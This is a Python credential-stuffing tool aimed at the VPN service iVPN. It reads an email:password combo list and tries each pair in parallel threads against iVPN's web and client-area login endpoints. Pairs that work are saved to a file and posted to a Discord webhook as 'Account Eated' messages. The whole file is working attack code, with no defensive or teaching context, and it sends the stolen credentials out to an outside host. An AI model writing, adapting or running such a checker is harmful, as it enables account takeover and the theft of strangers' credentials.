import argparse
import os.path
import time
from threading import Thread
from time import sleep
from dhooks import Webhook, Embed

from colorama import Fore
from requests import post


class iVpnChecker:
    def __init__(self):
        self.urls = {'web': 'https://www.ivpn.net/web/accounts/login',
                     'clientarea': 'https://www.ivpn.net/clientarea/app/login'}
        self.wh = Webhook('webhook to send valid accounts')
        self.threads = []
        self.delay = 0
        self.combo = None
        self.output = None
        self.valid = 0
        self.invalid = 0

    def send(self, email: str, password: str, code: str):
        embed = Embed(title=f'Account Eated', color=0x5CDBF0, timestamp='now')
        embed.add_field('Email', email)
        embed.add_field('Password', password)
        embed.add_field('Status Coe', code)
        embed.add_field('Thread Number', str(len(self.threads)))
        self.wh.send(embed=embed)

    def counter(self):
        while True:
            if os.name == 'nt':
                os.system(f'title Invalid: {self.invalid}, Valid: {self.valid}, Threads: {len(self.threads)}')
            else: pass
            sleep(1)

    def getHmac(self, email: str, password: str):
        payload = {"email": email, "password": password, "confirmation": "", "captcha_id": "", "captcha": ""}
        with post(self.urls['web'], data=payload) as request:
            return request.json()['hmac'] if request.status_code == 200 else ''

    def checkAcc(self, email: str, password: str):
        payload = {"hmac": self.getHmac(email, password), "email": email, "password": password}
        with post(self.urls['clientarea'], data=payload) as request:
            if request.status_code == 401 or request.status_code == 503:
                print(f'{Fore.RED}Invalid-[{request.status_code}]: {Fore.LIGHTMAGENTA_EX}{email}:{password}{Fore.RESET}')
                self.invalid += 1
            else:
                print(f'{Fore.LIGHTGREEN_EX}Valid-[{request.status_code}]: {Fore.GREEN}{email}:{password}{Fore.RESET}')
                with open(self.output, 'a+') as file:
                    file.write(f'{email}:{password}\n')
                    file.close()
                self.send(email, password, str(request.status_code))
                self.valid += 1

    def run(self):
        parser = argparse.ArgumentParser(description='')
        parser.add_argument('-c', type=str, help='combo file', required=True)
        parser.add_argument('-o', type=str, help='output file', default='output.txt', required=True)
        parser.add_argument('-d', type=float, help='delay', default=0.1, required=False)
        args = parser.parse_args()
        self.combo = args.c
        self.output = args.o
        self.delay = args.d
        Thread(target=self.counter, args=[])
        if os.path.exists(self.combo):
            with open(self.combo, 'r') as file:
                for line in file.readlines():
                    line = line.strip()
                    thread = Thread(target=self.checkAcc, args=[line.split(':')[0], line.split(':')[1]])
                    self.threads.append(thread)
                    thread.start()
                    time.sleep(self.delay)
        else:
            exit(f'File {self.combo} Not Found!')


if __name__ == '__main__':
    iVpnChecker().run()
